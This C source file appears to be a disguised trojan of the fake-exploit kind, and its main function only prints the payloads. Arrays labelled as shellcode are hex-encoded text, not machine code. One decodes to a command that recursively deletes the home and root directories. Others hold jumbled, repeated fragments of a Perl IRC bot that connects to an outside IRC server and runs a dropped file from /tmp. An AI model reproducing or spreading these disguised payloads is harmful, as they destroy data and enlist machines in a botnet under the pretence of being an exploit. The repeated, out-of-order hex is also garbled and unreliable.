#include <stdio.h>

char shellcode[] =
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x0a\x24\x6b\x65"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63"
        "\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22"
        "\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63"
        "\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22"
        "\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63"
        "\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d"
        "\x64\x20\x2b\x78\x20\x2f\x74\x6d\x70\x2f\x68\x69\x20\x32\x3e\x2f"
        "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b\x2f\x74\x6d\x70\x2f\x68\x69"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a";


char jmpcode[] =
    "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
    "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
char fbsd_shellcode[] =
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22"
        "\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63"
        "\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22"
        "\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63"
        "\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d"
        "\x64\x20\x2b\x78\x20\x2f\x74\x6d\x70\x2f\x68\x69\x20\x32\x3e\x2f"
        "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b\x2f\x74\x6d\x70\x2f\x68\x69"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b"
        "\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
        "\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20"
        "\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f"
        "\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24"
        "\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24"
        "\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e"
        "\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a"
        "\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79"
        "\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22"
        "\x7d\x7d\x23\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x2f\x74\x6d\x70"
        "\x2f\x68\x69\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b"
        "\x2f\x74\x6d\x70\x2f\x68\x69\x0a";
int main(int argc, char **argv){
	printf("---- jmpcode -----\n");
	puts(jmpcode);
	printf("----- fbsd_shellcode ------\n ");
	puts(fbsd_shellcode);
}	
